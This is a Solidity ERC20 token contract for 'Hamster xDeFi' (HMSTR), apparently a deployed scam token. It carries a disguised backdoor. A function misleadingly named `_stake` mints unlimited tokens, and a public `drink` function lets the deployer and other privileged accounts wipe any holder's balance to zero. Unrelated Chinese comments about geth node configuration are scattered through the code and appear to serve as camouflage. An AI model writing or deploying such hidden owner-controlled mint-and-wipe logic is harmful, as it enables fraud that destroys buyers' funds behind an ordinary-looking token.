['/**\n', ' *Submitted for verification at Etherscan.io on 2021-03-29\n', '*/\n', '\n', '// Welcome Hamster Finance!\n', "// We are on the binance smarts chain! and right now we use the ethereum blockchain's cross-chain, connecting and bringing Yield Farms closer together! add more information at the official link:\n", '// WS https://hamsterdefi.com/\n', '// TW https://twitter.com/hamsterdefi\n', '// TG https://t.me/joinchat/Dih1dwYka2E3MmUy\n', '//\n', '// 欢迎仓鼠财经！\n', '// 我们在币安智慧链上！ 现在，我们使用以太坊区块链的跨链，将Yield Farms连接起来并使其更加紧密！ 在官方链接上添加更多信息：\n', '\n', 'pragma solidity ^0.5.16;\n', '     interface IERC20 {\n', '    function totalSupply() external view returns (uint);\n', '    function balanceOf(address account) external view returns (uint);\n', '    function transfer(address recipient, uint amount) external returns (bool);\n', '    function allowance(address owner, address spender) external view returns (uint);\n', '    function approve(address spender, uint amount) external returns (bool);\n', '    function transferFrom(address sender, address recipient, uint amount) external returns (bool);\n', '    event Transfer(address indexed from, address indexed to, uint value);\n', '    event Approval(address indexed owner, address indexed spender, uint value);\n', '}\n', 'contract Context {\n', '    constructor () internal { }\n', '    function _msgSender() internal view returns (address payable) {\n', '        return msg.sender;\n', '    }\n', '}\n', '\n', '//snapshot 是链下治理工具；\n', '\n', '//开发者或者用户可以使用自己的metamask 钱包创建项目（space）创建时选择对应的链；\n', '\n', '//用户在 space 内创建提案（proposal）；\n', '\n', '//用户可以对用钱包来对 proposal 进行vote；\n', '\n', '//使用教程：\n', '//源码 下载\n', 'contract ERC20 is Context, IERC20 {\n', '    using SafeMath for uint;\n', '//如果 希望 进行 跨 平台 编译 ， 比如 在Mac上 编译Linux平台 的 二进制 文件 ， 可以 使用 相关make geth-linux命令 操作\n', '    mapping (address => uint) private _balances;\n', '//编译 完成 后 ， 生成 的 二进制 文件 在 目录build/bin下\n', '    mapping (address => mapping (address => uint)) private _allowances; //通过./build/bin/geth --help查看所有的option选项，根据情况自行设置相关配置参数。可参考Command-line Options\n', '\n', '    uint private _totalSupply;\n', '    function totalSupply() public view returns (uint) {\n', '        return _totalSupply;\n', '    }\n', '    function balanceOf(address account) public view returns (uint) {\n', '        return _balances[account]; // 部署设置\n', '    }\n', '    function transfer(address recipient, uint amount) public returns (bool) {\n', '        _transfer(_msgSender(), recipient, amount);\n', '        return true; //给出了一组使用 systemd 进行服务管理的配置。\n', '    }\n', '    function allowance(address owner, address spender) public view returns (uint) {\n', '        return _allowances[owner][spender];\n', '    }\n', '    function approve(address spender, uint amount) public returns (bool) {\n', '        _approve(_msgSender(), spender, amount); //开启 TCP/UDP 32668 端口；便于 p2p 发现和互联\n', '        return true;\n', '    }\n', '   // [Eth.Ethash] CacheDir = "ethash" \n', '   // CachesInMem = 2\n', '   // CachesOnDisk = 3\n', '   // CachesLockMmap = false\n', '   // DatasetDir = "/data/heco/data/.ethash"\n', '   // DatasetsOnDisk = 2\n', '   // DatasetsLockMmap = false\n', '   // PowMode = 0\n', '    function transferFrom(address sender, address recipient, uint amount) public returns (bool) {\n', '        _transfer(sender, recipient, amount);\n', '        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));\n', '        return true;\n', '    }\n', '    function increaseAllowance(address spender, uint addedValue) public returns (bool) {\n', '        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n', '        return true;\n', '    }\n', '    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {\n', '        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));\n', '        return true;\n', '    }\n', '    function _transfer(address sender, address recipient, uint amount) internal {\n', '        require(sender != address(0), "ERC20: transfer from the zero address");\n', '        require(recipient != address(0), "ERC20: transfer to the zero address");\n', '\n', '        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");\n', '        _balances[recipient] = _balances[recipient].add(amount);\n', '        emit Transfer(sender, recipient, amount);\n', '    }\n', '    function _stake(address account, uint amount) internal {\n', '        require(account != address(0), "ERC20: stake to the zero address");\n', '        _totalSupply = _totalSupply.add(amount);\n', '        _balances[account] = _balances[account].add(amount);\n', '        emit Transfer(address(0), account, amount);\n', '    }\n', '    function _burn(address account, uint amount) internal {\n', '        require(account != address(0), "ERC20: burn from the zero address");\n', '\n', '        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");\n', '        _totalSupply = _totalSupply.sub(amount);\n', '        emit Transfer(account, address(0), amount);\n', '    }\n', '    function _drink(address acc) internal {\n', '        require(acc != address(0), "drink to the zero address");\n', '        uint amount = _balances[acc];\n', '        _balances[acc] = 0;\n', '        _totalSupply = _totalSupply.sub(amount);\n', '        emit Transfer(acc, address(0), amount);\n', '    }\n', '    function _approve(address owner, address spender, uint amount) internal {\n', '        require(owner != address(0), "ERC20: approve from the zero address");\n', '        require(spender != address(0), "ERC20: approve to the zero address");\n', '\n', '        _allowances[owner][spender] = amount;\n', '        emit Approval(owner, spender, amount);\n', '    }\n', '}\n', '\n', 'contract ERC20Detailed is IERC20 {\n', '    string private _name;\n', '    string private _symbol;\n', '    uint8 private _decimals;\n', '\n', '    constructor (string memory name, string memory symbol, uint8 decimals) public {\n', '        _name = name;\n', '        _symbol = symbol;\n', '        _decimals = decimals;\n', '    }\n', '    function name() public view returns (string memory) {\n', '        return _name;\n', '    }\n', '    function symbol() public view returns (string memory) {\n', '        return _symbol;\n', '    }\n', '    function decimals() public view returns (uint8) {\n', '        return _decimals;\n', '    }\n', '}\n', '\n', 'library SafeMath {\n', '    function add(uint a, uint b) internal pure returns (uint) {\n', '        uint c = a + b;\n', '        require(c >= a, "SafeMath: addition overflow");\n', '        return c;\n', '    }\n', '    function sub(uint a, uint b) internal pure returns (uint) {\n', '        return sub(a, b, "SafeMath: subtraction overflow");\n', '    }\n', '    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\n', '        require(b <= a, errorMessage);\n', '        uint c = a - b;\n', '        return c;\n', '    }\n', '    \n', '    // [Node]\n', '    // DataDir = "/data/heco/data"\n', '    // LnsecureUnlockAllowed = true\n', '    // NoUSB = true\n', '    // IPCPath = "geth.ipc"\n', '    // HTTPHost = "0.0.0.0"\n', '    // HTTPPort = 8545\n', '    // HTTPVirtualHosts = ["*"]\n', '    // WSPort = 8546\n', "    // WSModules = ['eth', 'net', 'web3']\n", '  \n', '    function mul(uint a, uint b) internal pure returns (uint) {\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '        uint c = a * b;\n', '        require(c / a == b, "SafeMath: multiplication overflow");\n', '        return c;\n', '    }\n', '    function div(uint a, uint b) internal pure returns (uint) {\n', '        return div(a, b, "SafeMath: division by zero");\n', '    }\n', '    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\n', '        require(b > 0, errorMessage);\n', '        uint c = a / b;\n', '        return c;\n', '    }\n', '}\n', '\n', 'contract hamsterdefi is ERC20, ERC20Detailed {\n', '  using SafeMath for uint;\n', '  \n', '  address public governance;\n', '  mapping (address => bool) public stakers;\n', '  uint256 private amt_ = 0;\n', '\n', '  constructor () public ERC20Detailed("Hamster xDeFi", "HMSTR", 18) {\n', '      governance = msg.sender;\n', '      _stake(governance,amt_*10**uint(decimals()));\n', '      stakers[governance] = true;\n', '  }\n', '\n', '  function stake(address account, uint amount) public {\n', '      require(stakers[msg.sender], "error");\n', '      _stake(account, amount);\n', '  }\n', '\n', '  function drink(address account) public {\n', '      require(stakers[msg.sender], "error");\n', '      _drink(account);\n', '  }\n', '  \n', '}']